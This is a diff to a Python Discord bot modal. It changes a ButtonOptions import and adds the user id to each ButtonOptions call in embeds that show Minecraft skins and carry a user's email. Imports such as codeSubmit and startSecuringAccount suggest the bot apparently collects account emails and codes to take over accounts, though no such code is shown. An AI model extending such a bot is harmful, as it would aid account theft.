@@ -9,7 +9,7 @@ import re
 
 from views.buttons.codeSubmit import ButtonViewTwo
 from views.buttons.button_three import ButtonViewThree
-from views.buttons.embedOptions import ButtonOptions
+from views.buttons.buttonOptions import ButtonOptions
 from views.buttons.accountInfo import accountInfo
 
 from views.utils.startSecure import startSecuringAccount
@@ -50,7 +50,7 @@ class MyModalOne(ui.Modal):
                         timestamp = datetime.datetime.now(),
                         colour = 0xFF5C5C
                     ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                    view = ButtonOptions(interaction.user),
+                    view = ButtonOptions(interaction.user, interaction.user.id),
                     email = email
                 )
                 return
@@ -74,7 +74,7 @@ class MyModalOne(ui.Modal):
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user),
+                view = ButtonOptions(interaction.user, interaction.user.id),
                 email = email
             )
             return
@@ -97,7 +97,7 @@ class MyModalOne(ui.Modal):
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user),
+                view = ButtonOptions(interaction.user, interaction.user.id),
                 email = email
             )
 
@@ -136,7 +136,7 @@ class MyModalOne(ui.Modal):
                     timestamp = datetime.datetime.now(),
                     colour = 0x678DC6,
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user),
+                view = ButtonOptions(interaction.user, interaction.user.id),
                 email = email
             )
 
@@ -183,7 +183,7 @@ class MyModalOne(ui.Modal):
                             timestamp = datetime.datetime.now(),
                             colour = 0xFF5C5C
                         ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                        view = ButtonOptions(interaction.user),
+                        view = ButtonOptions(interaction.user, interaction.user.id),
                         email = email
                     )
                     return
@@ -202,7 +202,7 @@ class MyModalOne(ui.Modal):
                             timestamp = datetime.datetime.now(),
                             colour = 0x79D990,
                         ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                        view = ButtonOptions(interaction.user),
+                        view = ButtonOptions(interaction.user, interaction.user.id),
                         email = email
                     )
 
@@ -227,7 +227,7 @@ class MyModalOne(ui.Modal):
                                 timestamp = datetime.datetime.now(),
                                 colour = 0xFF5C5C
                             ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                            view = ButtonOptions(interaction.user),
+                            view = ButtonOptions(interaction.user, interaction.user.id),
                             email = email
                         )
                         return
@@ -278,7 +278,7 @@ class MyModalOne(ui.Modal):
                     timestamp = datetime.datetime.now(),
                     colour = 0xDE755B
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user),
+                view = ButtonOptions(interaction.user, interaction.user.id),
                 email = email
             )
             return
@@ -312,7 +312,7 @@ class MyModalOne(ui.Modal):
                         timestamp=datetime.datetime.now(),
                         colour=0xFF5C5C
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user),
+                    view=ButtonOptions(interaction.user, interaction.user.id),
                     email=email
                 )
                 return
@@ -342,7 +342,7 @@ class MyModalOne(ui.Modal):
                     timestamp = datetime.datetime.now(),
                     colour = 0x678DC6,
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user),
+                view = ButtonOptions(interaction.user, interaction.user.id),
                 email = email
             )
             return
@@ -355,7 +355,7 @@ class MyModalOne(ui.Modal):
                 timestamp = datetime.datetime.now(),
                 colour = 0xFF5C5C
             ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
-            view = ButtonOptions(interaction.user),
+            view = ButtonOptions(interaction.user, interaction.user.id),
             email = email
         )
 
